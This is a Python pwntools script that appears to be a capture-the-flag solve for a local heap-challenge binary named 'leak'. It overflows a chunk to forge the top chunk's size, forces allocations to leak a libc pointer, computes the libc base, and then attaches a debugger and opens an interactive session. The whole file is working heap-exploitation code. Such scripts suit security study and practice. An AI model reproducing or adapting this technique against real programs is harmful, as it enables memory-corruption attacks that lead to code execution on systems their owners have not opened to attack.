from pwn import *

p = process('./leak')
elf = ELF('./leak')
lib = elf.libc


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(id_, size_):
    choice(b'1');
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())


def edit(id_, mess):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.send(mess)


def show(id_):
    choice(b'3');
    p.recvuntil(b':')
    p.sendline(id_)


def delete(id_):
    choice(b'4');
    p.recvuntil(b':')
    p.sendline(id_)


add(b'0', 0x18)
payload = b'a' * 0x18 + p64(0xd91)
edit(b'0', payload)
add(b'1', 0x1000)
add(b'2', 0x400)
show(b'2')
base_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 0x3ec2a0
print(hex(base_addr))
# show(b'2')
# p.recvuntil(b'bb')
# heap_addr = u64(p.recvuntil(b'\n')[:-1].ljust(8, b'\00'))
# print(hex(heap_addr))
gdb.attach(p)
p.interactive()
